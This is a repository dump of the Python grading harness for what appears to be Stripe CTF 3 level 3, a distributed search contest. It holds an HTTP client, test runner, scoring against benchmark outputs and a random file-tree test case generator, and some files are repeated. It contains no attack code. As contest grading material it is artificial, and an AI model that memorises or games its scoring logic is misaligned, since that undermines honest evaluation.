            msg = "Could not verify host's SSL certificate."
        else:
            msg = ""
        msg = textwrap.fill(msg) + "\n\nNetwork error: %s" % e[1]
        raise error.HTTPConnectionError(msg)


class Urllib2Client(HTTPClient):
    if sys.version_info >= (3, 0):
        name = 'urllib.request'
    else:
        name = 'urllib2'

    def request(self, method, url, post_data=None):
        if sys.version_info >= (3, 0) and isinstance(post_data, str):
            post_data = post_data.encode('utf-8')

        req = urllib_request.Request(url, post_data, self.headers)

        if method not in ('get', 'post'):
            req.get_method = lambda: method.upper()

        try:
            response = urllib_request.urlopen(req)
            rbody = response.read()
            rcode = response.code
        except urllib_request.HTTPError:
            e = util.exception_as()
            rcode = e.code
            rbody = e.read()
        except (urllib_request.URLError, ValueError):
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            rbody = rbody.decode('utf-8')
        return rbody, rcode

    def _handle_request_error(self, e):
        msg = "Network error: %s" % str(e)
        raise error.HTTPConnectionError(msg)

########NEW FILE########
__FILENAME__ = test_framework
import difflib
import os.path
from random import SystemRandom
import re
import subprocess
import sys
import time

# From this package
import lib.error as error
import lib.http_client as http_client
import lib.util as util

data_directory = os.path.join(os.path.dirname(__file__), "..", "data")

class TestCase(object):
    def __init__(self, harness, id_or_url):
        self.harness = harness
        self.id, self.url = self.normalize_id_and_url(id_or_url)
        self.json = None

    def normalize_id_and_url(self, id_or_url):
        if re.match("\Ahttps?:", id_or_url):
            url = id_or_url
            # Look at the last component and remove extension
            id = id_or_url.split('/')[-1].split('.')[0]
        else:
            id = id_or_url
            level = self.harness.LEVEL
            url = "https://stripe-ctf-3.s3.amazonaws.com/level%s/%s.json" % (level, id)
        return id, url

    def dump_path(self):
        return os.path.join(self.harness.test_cases_path(), self.id + ".json")

    def load(self):
        if self.json: return self.json
        try:
            f = open(self.dump_path(), "r")
            self.json = util.json.load(f)
            f.close()
            return self.json
        except IOError:
            pass
        util.logger.info('Fetching. URL: %s', self.url)
        content = self.harness.fetch_s3_resource(self.url)
        try:
            self.json = util.json.loads(content)
        except ValueError:
            # Decoding the JSON failed.
            msg = ("There was a problem parsing the test case. We expected "
                   "JSON. We received: %s" % (content,))
            raise error.StripeError(msg)
        return self.json

    def flush(self):
        f = open(os.path.join(self.harness.test_cases_path(), self.id + ".json"), "w")
        util.json.dump(self.json, f)
        f.close()

class AbstractHarness(object):
    def __init__(self, ids_or_urls=[], options={}):
        util.mkdir_p(self.test_cases_path())
        if not os.path.isfile(http_client.certs_path()):
            msg = ("You seem to have deleted the file of certificates "
                   "that shipped with this repo. It should exist "
                   "at %s" % http_client.certs_path())
            raise error.StripeError(msg)
        if ids_or_urls == []:
            util.logger.info('No test case supplied. Randomly choosing among defaults.')
            ids_or_urls = [SystemRandom().choice(self.DEFAULT_TEST_CASES)]
        self.test_cases = map(lambda token: TestCase(self, token), ids_or_urls)
        self.options = options
        headers = {
            'User-Agent': 'Stripe TestHarness/%s' % (self.VERSION,),
        }
        self.http_client = http_client.new_default_http_client(headers=headers, verify_ssl_certs=True)

    def fetch_s3_resource(self, url):
        try:
            content, status_code = self.http_client.request("get", url)
        except error.HTTPConnectionError:
            err = util.exception_as()
            msg = ("There was an error while connecting to fetch "
                   "the url %s. Please check your connectivity. If there "
                   "continues to be an issue, please let us know at "
                   "ctf@stripe.com. The specific error is:\n" % (url,))
            raise error.StripeError(msg + str(err))
        if status_code == 200:
            return content
        elif status_code == 403:
            msg = ("We received a 403 while fetching the url %s. "
                   "This probably means that you are trying to get "
                   "something that doesn't actually exist." % (url,))
            raise error.StripeError(msg)
        else:
            msg = ("We received the unexpected response code %i while "
                   "fetching the url %s." % (status_code, url,))
            raise error.StripeError(msg)

    def run(self):
        task = self.options["task"]

        if task == "execute":
            test_cases_to_execute = self.load_test_cases()
            self.execute(test_cases_to_execute)
        else:
            raise StandardError("Unrecognized task " +  task)

    def test_cases_path(self):
        return os.path.join(
            data_directory,
            "downloaded_test_cases",
            "version%i" % self.VERSION)

    def flush_test_cases(self):
        util.logger.info('Flushing. Path: %s', self.test_cases_path())
        for test_case in self.test_cases:
            test_case.flush(self.test_cases_path())

    def add_test_case(self, test_case):
        self.test_cases.append(test_case)

    def load_test_cases(self):
        loaded_test_cases = []
        for test_case in self.test_cases:
            result = test_case.load()
            if not result: continue
            test_case.flush()
            loaded_test_cases.append(test_case)
        return loaded_test_cases

    def hook_preexecute(self):
        # May override
        pass

    def execute(self, test_cases_to_execute):
        self.hook_preexecute()
        runner = self.hook_create_runner()

        for test_case in test_cases_to_execute:
            if self.options["raw"]:
                util.logger.info(runner.run_test_case_raw(test_case.json))
            else:
                runner.run_test_case(test_case.json)

class AbstractRunner(object):
    def __init__(self, options):
        pass

    # may override
    def code_directory(self):
        return os.path.join(os.path.dirname(__file__), "..")

    def log_diff(self, benchmark_output, user_output):
        util.logger.info("Here is the head of your output:")
        util.logger.info(user_output[0:1000])
        diff = list(difflib.Differ().compare(benchmark_output.splitlines(True),
                                             user_output.splitlines(True)))
        lines = filter(lambda line: line[0] != "?", diff[0:20])
        util.logger.info("\n***********\n")
        util.logger.info("Here is the head of the diff between your output and the benchmark:")
        util.logger.info("".join(lines))

    def run_build_sh(self):
        util.logger.info("Building your code via `build.sh`.")
        build_runner = subprocess.Popen([
            os.path.join(self.code_directory(), "build.sh")],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Blocks
        stdout, stderr = build_runner.communicate()
        if build_runner.returncode == 0:
            util.logger.info("Done building your code.")
        else:
            util.logger.info("Build failed with code %i. Stderr:", build_runner.returncode)
            util.logger.info(stderr)

    # may override
    def hook_prerun(self):
        pass

    def run_test_case(self, test_case):
        self.hook_prerun()
        id = test_case['id']
        util.logger.info("About to run test case: %s" % id)
        input = test_case['input']
        result = self.run_input(input)
        return self.report_result(test_case, result)

    def run_test_case_raw(self, test_case):
        self.hook_prerun()
        input = test_case['input']
        result = self.run_input(input)
        return result['output']

    def run_input(self, input):
        util.logger.info("Beginning run.")
        output = self.run_subprocess_command(self.subprocess_command(), input)
        util.logger.info('Finished run')
        return output

    def report_stderr(self, stderr):
        if not stderr: return
        util.logger.info("Standard error from trial run:")
        util.logger.info(stderr)

    def subprocess_communicate(self, runner, input):
        if sys.version_info >= (3, 0):
            input = input.encode('utf-8')
        stdout, stderr = runner.communicate(input)
        if sys.version_info >= (3, 0):
            stderr = stderr.decode('utf-8')
            stdout = stdout.decode('utf-8')
        return stdout, stderr

    def run_subprocess_command(self, command, input):
        start_time = time.time()
        runner = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = self.subprocess_communicate(runner, input)
        end_time = time.time()
        return {
            'wall_clock_time': end_time - start_time,
            'output': stdout,
            'input': input,
            'level': self.LEVEL,
            'exitstatus': runner.returncode,
            }

########NEW FILE########
__FILENAME__ = util
import logging
import os
from random import SystemRandom
import sys

logger = logging.getLogger('stripe')
logger.addHandler(logging.StreamHandler(sys.stdout))
logger.setLevel(logging.INFO)

__all__ = ['StringIO', 'json', 'utf8', 'random_letters', 'mkdir_p']

if sys.version_info < (3,0):
    # Used to interface with pycurl, which we only make available for
    # those Python versions
    try:
        import cStringIO as StringIO
    except ImportError:
        import StringIO

try:
    import json
except ImportError:
    json = None

if not (json and hasattr(json, 'loads')):
    try:
        import simplejson as json
    except ImportError:
        if not json:
            raise ImportError(
                "Stripe requires a JSON library, such as simplejson. "
                "HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' or "
                "'easy_install simplejson'.")
        else:
            raise ImportError(
                "Stripe requires a JSON library with the same interface as "
                "the Python 2.6 'json' library.  You appear to have a 'json' "
                "library with a different interface.  Please install "
                "the simplejson library.  HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' "
                "or 'easy_install simplejson'.")


def utf8(value):
    if sys.version_info < (3, 0) and isinstance(value, unicode):
        return value.encode('utf-8')
    else:
        return value

def random_letters(count=4):
    LETTERS = "abcdefghijklmnopqrstuvwxyz"
    output = []
    for i in range(0, count):
        output.append(SystemRandom().choice(LETTERS))
    return "".join(output)

# TODO: Python >2.5 ?
def mkdir_p(path):
    try:
        os.makedirs(path)
    except OSError:
        if os.path.isdir(path): pass
        else: raise

def exception_as():
    _, err, _ = sys.exc_info()
    return err

########NEW FILE########
__FILENAME__ = runner
import os.path
import subprocess
import time
import sys
import urlparse
import shutil

# From this package
import lib.error as error
import lib.http_client as http_client
import lib.test_framework as test_framework
import lib.util as util

from test_case_generator import TestCaseGenerator

class Runner(test_framework.AbstractRunner):
    LEVEL = 3
    TEST_CASE_PATH = os.path.join(os.path.dirname(__file__),
                                  'data/input')

    def __init__(self, options):
        self.client = http_client.new_default_http_client()
        self.dictionary_path = options['dictionary_path']
        self.child_popens = []
        super(Runner, self).__init__(options)

    def hook_prerun(self):
        self.run_build_sh()

    # Scala compiles are slow; just let start-servers use SBT.
    def run_build_sh(self):
        pass

    def cleanup(self):
        util.logger.info('Cleaning up children')
        for popen in self.child_popens:
            util.logger.info("Killing child's pgid: %d" % popen.pid)
            os.killpg(popen.pid, 15)

    def subprocess_command(self):
        return [self.executable_path(), self.dictionary_path]

    def executable_path(self):
        return os.path.join(os.path.dirname(__file__), "..", "level0")

    def uri(self, route):
        return urlparse.urljoin('http://localhost:9090/', route)

    def execute_query(self, substring):
        return self.client.request('GET', self.uri('/?q=%s' % substring))

    def index(self, path):
        return self.client.request('GET', self.uri('/index?path=%s' % path))

    def start_servers(self):
        p = subprocess.Popen(['bin/start-servers'],
                             preexec_fn=lambda: os.setpgid(0, 0),
                             stdout=sys.stdout,
                             stderr=sys.stderr)
        self.child_popens.append(p)

    def check_server(self, path, msg, max_attempts):
        attempts = 0
        backoff = 1

        while True:
            try:
                if attempts > max_attempts:
                    raise error.StripeError("Unable to start server up")

                body, code = self.client.request('GET', path)
                if (code == 200) and ("true" in body):
                    return
            except error.HTTPConnectionError as e:
                attempts += 1
                backoff *= 2
                util.logger.info('(# %i) Sleeping for %is while server %s' % (attempts, backoff, msg))
                time.sleep(backoff)

    def write_files(self, files, base_path):
        if os.path.isdir(base_path):
            shutil.rmtree(base_path)
        for filepath, contents in files.iteritems():
            filename = os.path.join(base_path, filepath)
            file_dir = os.path.dirname(filename)

            util.mkdir_p(file_dir)
            util.logger.debug("Writing out file %s" % filepath)
            f = open(filename, 'w')
            f.write(contents)
            f.close()

        util.logger.info("All done writing out input data")

    # override
    def run_input(self, cmd_line_args):
        # Don't print out to stdout.
        options_dict = TestCaseGenerator.opt_parse(map(lambda x: str(x), cmd_line_args))
        options_dict['dictionary_path'] = self.dictionary_path
        options_dict['should_print'] = False
        test_case_input = TestCaseGenerator(options_dict).generate_test_case()

        files = test_case_input['files']
        keys = test_case_input['keys']

        path = self.TEST_CASE_PATH

        util.logger.info('Writing tree to %s', path)
        self.write_files(files, path)

        util.logger.info('Starting servers')
        self.start_servers()

        util.logger.info('Waiting for server to come up')

        self.check_server(self.uri('/healthcheck'), 'starts', 3)

        util.logger.info('Indexing %s', path)
        self.index(path)

        util.logger.info('Waiting for servers to finish indexing')
        self.check_server(self.uri('/isIndexed'), 'indexes', 8)

        responses = []

        start_time = time.time()

        for key in keys:
            body, code = self.execute_query(key)
            try:
                parsed = util.json.loads(body)
                responses.append([parsed['results'], code])
            except:
                raise error.StripeError('The search for %s returned invalid JSON: %s' % (key, body))

        end_time = time.time()

        average_response_time = (end_time - start_time) / len(keys)

        return {
            'wall_clock_time': average_response_time,
            'output': map(lambda x: x[0], responses),
            'input': cmd_line_args,
            'level': self.LEVEL,
            'exitstatus': 0,
        }

    def report_result(self, test_case, result):
        benchmark_output = test_case['output']
        benchmark_time = test_case['wall_clock_time']

        your_output = result['output']
        your_time = result['wall_clock_time']

        returncode = result['exitstatus']

        if returncode != 0:
            util.logger.info('Not all of your requests returned 200s')
        else:
            passed = True
            for (idx, your) in enumerate(your_output):
                sorted_benchmark = sorted(benchmark_output[idx])
                sorted_your = sorted(your)

                if sorted_benchmark != sorted_your:
                    passed = False
                    self.log_diff("\n".join(sorted_benchmark), "\n".join(sorted_your))

            time_ratio = (benchmark_time*1.0) / your_time
            score = round(time_ratio * 100)

            if passed:
                msg = ("Test case passed! Your time: %(your_time)f. Benchmark time: "
                       "%(benchmark_time)f. You/Benchmark: %(time_ratio)f. Score: %(score)d")
                util.logger.info(msg %
                            {"your_time": your_time,
                             "benchmark_time": benchmark_time,
                             "time_ratio": time_ratio,
                             "score": score
                            })


########NEW FILE########
__FILENAME__ = test_case_generator
from optparse import OptionParser
import random
import string
import os
import json
import runner
import sys

class Directory(object):
    def __init__(self, name, file_count, parent=None):
        self.name = name
        self.parent = parent
        self.file_count = file_count
        self.children = []

        if self.parent != None:
            self.parent.children.append(self)

    def path(self):
        if self.parent == None:
            return self.name
        else:
            return os.path.join(self.parent.path(), self.name)

class Tree(object):
    def __init__(self, depth, root):
        self.depth = depth
        self.root = root
        self.directories = {0: [root]}

    def layers(self):
        return [self.directories[i] for i in range(self.depth)]

class TestCaseGenerator(object):
    TREE_COUNT = 3
    NUM_KEYS = 50
    MIN_WORDS = 500
    MAX_WORDS = 2000
    MAX_BRANCHES = 5
    MIN_BRANCHES = 0
    MIN_DEPTH = 2
    MAX_DEPTH = 5

    def __init__(self, options):
        self.dictionary_path = options.get('dictionary_path') or '/usr/share/dict/words'
        self.seed = options['seed']
        self.rnd = random.Random()
        self.rnd.seed(self.seed)

        self.should_print = options.get('should_print') or False

        self.tree_count = options.get('num_trees') or self.TREE_COUNT
        self.num_keys = options.get('num_keys') or self.NUM_KEYS

        self.min_words = options.get('min_words') or self.MIN_WORDS
        self.max_words = options.get('max_words') or self.MAX_WORDS

        self.min_depth = options.get('min_depth') or self.MIN_DEPTH
        self.max_depth = options.get('max_depth') or self.MAX_DEPTH

        self.min_branches = options.get('min_branches') or self.MIN_BRANCHES
        self.max_branches = options.get('max_branches') or self.MAX_BRANCHES

    def generate_test_case(self):
        out = {}
        forest, keys = self.generate_forest_and_keys(self.max_depth)

        out['files'] = forest
        out['keys'] = keys

        if self.should_print:
            print json.dumps(out)

        return out

    def generate_forest_and_keys(self, max_depth):
        words = self.dictionary_words()
        trees = []
        out = {}
        keys = []
        content_size = 0

        for i in range(self.tree_count):
            trees.append(self.make_tree())
        for tree in trees:
            for layer in tree.layers():
                for directory in layer:
                    path = directory.path()
                    for f in range(directory.file_count):
                        contents, keys_in_file = self.random_contents_and_keys(words)
                        keys += keys_in_file

                        file_path = os.path.join(path, self.random_string())
                        out[file_path] = contents
                        content_size += len(contents)

	sys.stderr.write("Number of files: %d\n" % len(out.keys()))
	sys.stderr.write("Total content size: %fMB\n" % (content_size / 1024.0 / 1024.0))
        return [out, self.rnd.sample(keys, self.num_keys)]

    def make_tree(self):
        depth = self.rnd.randint(self.min_depth, self.max_depth)
        tree = Tree(depth,
            Directory(self.random_string(),
            self.rnd.randint(1, 5)))

        for i in range(1, tree.depth):
            tree.directories[i] = []
            for parent in tree.directories[i - 1]:
                for branch in range(self.rnd.randint(self.min_branches, self.max_branches)):
                    directory = Directory(
                        self.random_string(),
                        self.rnd.randint(0, 5),
                        parent)
                    tree.directories[i].append(directory)

        return tree

    def random_contents_and_keys(self, words):
        length = self.rnd.randint(self.min_words, self.max_words)
        contents = []
        keys = []
        for i in range(length):
            word = self.rnd.choice(words)

            if self.rnd.random() > 0.70:
                keys.append(word)

            if self.rnd.random() > 0.95:
                word += '\n'
            elif self.rnd.random() > 0.90:
                word += '.'

            contents.append(word)

        return [' '.join(contents), keys]

    def dictionary_words(self):
        f = open(self.dictionary_path, 'r')
        words = f.read()
        f.close()
        return words.split('\n')

    # http://stackoverflow.com/questions/2257441/python-random-string-generation-with-upper-case-letters-and-digits
    def random_string(self, length=8):
        character_set = string.ascii_uppercase + string.digits
        return ''.join(
            self.rnd.choice(character_set) for x in range(length))

    @staticmethod
    def opt_parse(flags):
        usage = "usage: %prog [options]"
        parser = OptionParser(usage=usage)
        parser.add_option("-s", "--seed", dest="seed", help="Seed for random generator", type=int)
        parser.add_option("-p", "--print", dest="should_print", help="Print output to stdout", action="store_true")
        parser.add_option("-t", "--num-trees", dest="num_trees", help="Number of trees to generate", type=int)
        parser.add_option("-k", "--num-keys", dest="num_keys", help="Number of keys to test against", type=int)
        parser.add_option("-x", "--min-depth", dest="min_depth", help="Minimum depth of trees", type=int)
        parser.add_option("-d", "--max-depth", dest="max_depth", help="Maximum depth of trees", type=int)
        parser.add_option("-w", "--min-words", dest="min_words", help="Minimum number of words in each file", type=int)
        parser.add_option("-m", "--max-words", dest="max_words", help="Maximum number of words in each file", type=int)
        parser.add_option("-n", "--min-branches", dest="min_branches", help="Minimum number of branches", type=int)
        parser.add_option("-b", "--max-branches", dest="max_branches", help="Maximum number of branches", type=int)

        (options, args) = parser.parse_args(flags)
        options_dict = vars(options)

        return options_dict

def main():
    default_options = {"seed": random.randint(0, 1000)}
    options_dict = TestCaseGenerator.opt_parse(sys.argv)

    for key in default_options:
        if options_dict.get(key) is None:
            options_dict[key] = default_options[key]

    generator = TestCaseGenerator(options_dict)
    tree = generator.generate_test_case()

if __name__ == "__main__":
        main()

########NEW FILE########
__FILENAME__ = error
# Exceptions
class StripeError(Exception):
    pass

class HTTPConnectionError(StripeError):
    pass

########NEW FILE########
__FILENAME__ = http_client
import os
import sys
import textwrap

# From this package
import lib.error as error
import lib.util as util

# This is a port of http_client from [Stripe-Python](https://github.com/stripe/stripe-python)

# - Requests is the preferred HTTP library
# - Use Pycurl if it's there (at least it verifies SSL certs)
# - Fall back to urllib2 with a warning if needed

try:
    if sys.version_info < (3,0):
        import urllib2 as urllib_request
    else:
        import urllib.request as urllib_request
except ImportError:
    pass

try:
    import pycurl
except ImportError:
    pycurl = None

try:
    import requests
except ImportError:
    requests = None
else:
    try:
        # Require version 0.8.8, but don't want to depend on distutils
        version = requests.__version__
        major, minor, patch = [int(i) for i in version.split('.')]
    except Exception:
        # Probably some new-fangled version, so it should support verify
        pass
    else:
        if (major, minor, patch) < (0, 8, 8):
            util.logger.warn(
                'Warning: the test harness will only use your Python "requests"'
                'library if it is version 0.8.8 or newer, but your '
                '"requests" library is version %s. We will fall back to '
                'an alternate HTTP library so everything should work. We '
                'recommend upgrading your "requests" library. (HINT: running '
                '"pip install -U requests" should upgrade your requests '
                'library to the latest version.)' % (version,))
            requests = None

def certs_path():
    return os.path.join(os.path.dirname(__file__), 'ca-certificates.crt')


def new_default_http_client(*args, **kwargs):
    if requests:
        impl = RequestsClient
    elif pycurl and sys.version_info < (3,0):
        # Officially supports in 3.1-3.3 but not 3.0. The idea is that for >=2.6
        # you should use requests
        impl = PycurlClient
    else:
        impl = Urllib2Client
        if sys.version_info < (2,6):
            reccomendation = "pycurl"
        else:
            reccomendation = "requests"
        util.logger.info(
            "Warning: The test harness is falling back to *urllib2*. "
            "Its SSL implementation doesn't verify server "
            "certificates (how's that for a distributed systems problem?). "
            "We recommend instead installing %(rec)s via `pip install %(rec)s`.",
            {'rec': reccomendation})

    return impl(*args, **kwargs)


class HTTPClient(object):

    def __init__(self, headers={}, verify_ssl_certs=True):
        self._verify_ssl_certs = verify_ssl_certs
        self.headers = headers

    def request(self, method, url, post_data=None):
        raise NotImplementedError(
            'HTTPClient subclasses must implement `request`')


class RequestsClient(HTTPClient):
    name = 'requests'

    def request(self, method, url, post_data=None):
        kwargs = {}

        if self._verify_ssl_certs:
            kwargs['verify'] = certs_path()
        else:
            kwargs['verify'] = False

        try:
            try:
                result = requests.request(method,
                                          url,
                                          headers=self.headers,
                                          data=post_data,
                                          timeout=80,
                                          **kwargs)
            except TypeError:
                e = util.exception_as()
                raise TypeError(
                    'Warning: It looks like your installed version of the '
                    '"requests" library is not compatible with Stripe\'s '
                    'usage thereof. (HINT: The most likely cause is that '
                    'your "requests" library is out of date. You can fix '
                    'that by running "pip install -U requests".) The '
                    'underlying error was: %s' % (e,))

            # This causes the content to actually be read, which could cause
            # e.g. a socket timeout. TODO: The other fetch methods probably
            # are succeptible to the same and should be updated.
            content = result.content
            status_code = result.status_code
        except Exception:
            # Would catch just requests.exceptions.RequestException, but can
            # also raise ValueError, RuntimeError, etc.
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            content = content.decode('utf-8')
        return content, status_code

    def _handle_request_error(self, e):
        if isinstance(e, requests.exceptions.RequestException):
            err = "%s: %s" % (type(e).__name__, str(e))
        else:
            err = "A %s was raised" % (type(e).__name__,)
            if str(e):
                err += " with error message %s" % (str(e),)
            else:
                err += " with no error message"
        msg = "Network error: %s" % (err,)
        raise error.HTTPConnectionError(msg)

class PycurlClient(HTTPClient):
    name = 'pycurl'

    def request(self, method, url, post_data=None):
        s = util.StringIO.StringIO()
        curl = pycurl.Curl()

        if method == 'get':
            curl.setopt(pycurl.HTTPGET, 1)
        elif method == 'post':
            curl.setopt(pycurl.POST, 1)
            curl.setopt(pycurl.POSTFIELDS, post_data)
        else:
            curl.setopt(pycurl.CUSTOMREQUEST, method.upper())

        # pycurl doesn't like unicode URLs
        curl.setopt(pycurl.URL, util.utf8(url))

        curl.setopt(pycurl.WRITEFUNCTION, s.write)
        curl.setopt(pycurl.NOSIGNAL, 1)
        curl.setopt(pycurl.CONNECTTIMEOUT, 30)
        curl.setopt(pycurl.TIMEOUT, 80)
        curl.setopt(pycurl.HTTPHEADER, ['%s: %s' % (k, v)
                    for k, v in self.headers.iteritems()])
        if self._verify_ssl_certs:
            curl.setopt(pycurl.CAINFO, certs_path())
        else:
            curl.setopt(pycurl.SSL_VERIFYHOST, False)

        try:
            curl.perform()
        except pycurl.error:
            e = util.exception_as()
            self._handle_request_error(e)
        rbody = s.getvalue()
        rcode = curl.getinfo(pycurl.RESPONSE_CODE)
        return rbody, rcode

    def _handle_request_error(self, e):
        error_code = e[0]
        if error_code in [pycurl.E_COULDNT_CONNECT,
                          pycurl.E_COULDNT_RESOLVE_HOST,
                          pycurl.E_OPERATION_TIMEOUTED]:
            msg = ("Test harness could not connect to Stripe. Please check "
                   "your internet connection and try again.")
        elif (error_code in [pycurl.E_SSL_CACERT,
                             pycurl.E_SSL_PEER_CERTIFICATE]):
            msg = "Could not verify host's SSL certificate."
        else:
            msg = ""
        msg = textwrap.fill(msg) + "\n\nNetwork error: %s" % e[1]
        raise error.HTTPConnectionError(msg)


class Urllib2Client(HTTPClient):
    if sys.version_info >= (3, 0):
        name = 'urllib.request'
    else:
        name = 'urllib2'

    def request(self, method, url, post_data=None):
        if sys.version_info >= (3, 0) and isinstance(post_data, str):
            post_data = post_data.encode('utf-8')

        req = urllib_request.Request(url, post_data, self.headers)

        if method not in ('get', 'post'):
            req.get_method = lambda: method.upper()

        try:
            response = urllib_request.urlopen(req)
            rbody = response.read()
            rcode = response.code
        except urllib_request.HTTPError:
            e = util.exception_as()
            rcode = e.code
            rbody = e.read()
        except (urllib_request.URLError, ValueError):
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            rbody = rbody.decode('utf-8')
        return rbody, rcode

    def _handle_request_error(self, e):
        msg = "Network error: %s" % str(e)
        raise error.HTTPConnectionError(msg)

########NEW FILE########
__FILENAME__ = test_framework
import difflib
import os.path
from random import SystemRandom
import re
import subprocess
import sys
import time

# From this package
import lib.error as error
import lib.http_client as http_client
import lib.util as util

data_directory = os.path.join(os.path.dirname(__file__), "..", "data")

class TestCase(object):
    def __init__(self, harness, id_or_url):
        self.harness = harness
        self.id, self.url = self.normalize_id_and_url(id_or_url)
        self.json = None

    def normalize_id_and_url(self, id_or_url):
        if re.match("\Ahttps?:", id_or_url):
            url = id_or_url
            # Look at the last component and remove extension
            id = id_or_url.split('/')[-1].split('.')[0]
        else:
            id = id_or_url
            level = self.harness.LEVEL
            url = "https://stripe-ctf-3.s3.amazonaws.com/level%s/%s.json" % (level, id)
        return id, url

    def dump_path(self):
        return os.path.join(self.harness.test_cases_path(), self.id + ".json")

    def load(self):
        if self.json: return self.json
        try:
            f = open(self.dump_path(), "r")
            self.json = util.json.load(f)
            f.close()
            return self.json
        except IOError:
            pass
        util.logger.info('Fetching. URL: %s', self.url)
        content = self.harness.fetch_s3_resource(self.url)
        try:
            self.json = util.json.loads(content)
        except ValueError:
            # Decoding the JSON failed.
            msg = ("There was a problem parsing the test case. We expected "
                   "JSON. We received: %s" % (content,))
            raise error.StripeError(msg)
        return self.json

    def flush(self):
        f = open(os.path.join(self.harness.test_cases_path(), self.id + ".json"), "w")
        util.json.dump(self.json, f)
        f.close()

class AbstractHarness(object):
    def __init__(self, ids_or_urls=[], options={}):
        util.mkdir_p(self.test_cases_path())
        if not os.path.isfile(http_client.certs_path()):
            msg = ("You seem to have deleted the file of certificates "
                   "that shipped with this repo. It should exist "
                   "at %s" % http_client.certs_path())
            raise error.StripeError(msg)
        if ids_or_urls == []:
            util.logger.info('No test case supplied. Randomly choosing among defaults.')
            ids_or_urls = [SystemRandom().choice(self.DEFAULT_TEST_CASES)]
        self.test_cases = map(lambda token: TestCase(self, token), ids_or_urls)
        self.options = options
        headers = {
            'User-Agent': 'Stripe TestHarness/%s' % (self.VERSION,),
        }
        self.http_client = http_client.new_default_http_client(headers=headers, verify_ssl_certs=True)

    def fetch_s3_resource(self, url):
        try:
            content, status_code = self.http_client.request("get", url)
        except error.HTTPConnectionError:
            err = util.exception_as()
            msg = ("There was an error while connecting to fetch "
                   "the url %s. Please check your connectivity. If there "
                   "continues to be an issue, please let us know at "
                   "ctf@stripe.com. The specific error is:\n" % (url,))
            raise error.StripeError(msg + str(err))
        if status_code == 200:
            return content
        elif status_code == 403:
            msg = ("We received a 403 while fetching the url %s. "
                   "This probably means that you are trying to get "
                   "something that doesn't actually exist." % (url,))
            raise error.StripeError(msg)
        else:
            msg = ("We received the unexpected response code %i while "
                   "fetching the url %s." % (status_code, url,))
            raise error.StripeError(msg)

    def run(self):
        task = self.options["task"]

        if task == "execute":
            test_cases_to_execute = self.load_test_cases()
            self.execute(test_cases_to_execute)
        else:
            raise StandardError("Unrecognized task " +  task)

    def test_cases_path(self):
        return os.path.join(
            data_directory,
            "downloaded_test_cases",
            "version%i" % self.VERSION)

    def flush_test_cases(self):
        util.logger.info('Flushing. Path: %s', self.test_cases_path())
        for test_case in self.test_cases:
            test_case.flush(self.test_cases_path())

    def add_test_case(self, test_case):
        self.test_cases.append(test_case)

    def load_test_cases(self):
        loaded_test_cases = []
        for test_case in self.test_cases:
            result = test_case.load()
            if not result: continue
            test_case.flush()
            loaded_test_cases.append(test_case)
        return loaded_test_cases

    def hook_preexecute(self):
        # May override
        pass

    def execute(self, test_cases_to_execute):
        self.hook_preexecute()
        runner = self.hook_create_runner()

        for test_case in test_cases_to_execute:
            if self.options["raw"]:
                util.logger.info(runner.run_test_case_raw(test_case.json))
            else:
                runner.run_test_case(test_case.json)

class AbstractRunner(object):
    def __init__(self, options):
        pass

    # may override
    def code_directory(self):
        return os.path.join(os.path.dirname(__file__), "..")

    def log_diff(self, benchmark_output, user_output):
        util.logger.info("Here is the head of your output:")
        util.logger.info(user_output[0:1000])
        diff = list(difflib.Differ().compare(benchmark_output.splitlines(True),
                                             user_output.splitlines(True)))
        lines = filter(lambda line: line[0] != "?", diff[0:20])
        util.logger.info("\n***********\n")
        util.logger.info("Here is the head of the diff between your output and the benchmark:")
        util.logger.info("".join(lines))

    def run_build_sh(self):
        util.logger.info("Building your code via `build.sh`.")
        build_runner = subprocess.Popen([
            os.path.join(self.code_directory(), "build.sh")],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Blocks
        stdout, stderr = build_runner.communicate()
        if build_runner.returncode == 0:
            util.logger.info("Done building your code.")
        else:
            util.logger.info("Build failed with code %i. Stderr:", build_runner.returncode)
            util.logger.info(stderr)

    def run_test_case(self, test_case):
        id = test_case['id']
        util.logger.info("About to run test case: %s" % id)
        input = test_case['input']
        result = self.run_input(input)
        return self.report_result(test_case, result)

    def run_test_case_raw(self, test_case):
        self.hook_prerun()
        input = test_case['input']
        result = self.run_input(input)
        return result['output']

    def run_input(self, input):
        util.logger.info("Beginning run.")
        output = self.run_subprocess_command(self.subprocess_command(), input)
        util.logger.info('Finished run')
        return output

    def report_stderr(self, stderr):
        if not stderr: return
        util.logger.info("Standard error from trial run:")
        util.logger.info(stderr)

    def subprocess_communicate(self, runner, input):
        if sys.version_info >= (3, 0):
            input = input.encode('utf-8')
        stdout, stderr = runner.communicate(input)
        if sys.version_info >= (3, 0):
            stderr = stderr.decode('utf-8')
            stdout = stdout.decode('utf-8')
        return stdout, stderr

    def run_subprocess_command(self, command, input):
        start_time = time.time()
        runner = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = self.subprocess_communicate(runner, input)
        end_time = time.time()
        return {
            'wall_clock_time': end_time - start_time,
            'output': stdout,
            'input': input,
            'level': self.LEVEL,
            'exitstatus': runner.returncode,
            }

########NEW FILE########
__FILENAME__ = util
import logging
import os
from random import SystemRandom
import sys

logger = logging.getLogger('stripe')
logger.addHandler(logging.StreamHandler(sys.stdout))
logger.setLevel(logging.INFO)

__all__ = ['StringIO', 'json', 'utf8', 'random_letters', 'mkdir_p']

if sys.version_info < (3,0):
    # Used to interface with pycurl, which we only make available for
    # those Python versions
    try:
        import cStringIO as StringIO
    except ImportError:
        import StringIO

try:
    import json
except ImportError:
    json = None

if not (json and hasattr(json, 'loads')):
    try:
        import simplejson as json
    except ImportError:
        if not json:
            raise ImportError(
                "Stripe requires a JSON library, such as simplejson. "
                "HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' or "
                "'easy_install simplejson'.")
        else:
            raise ImportError(
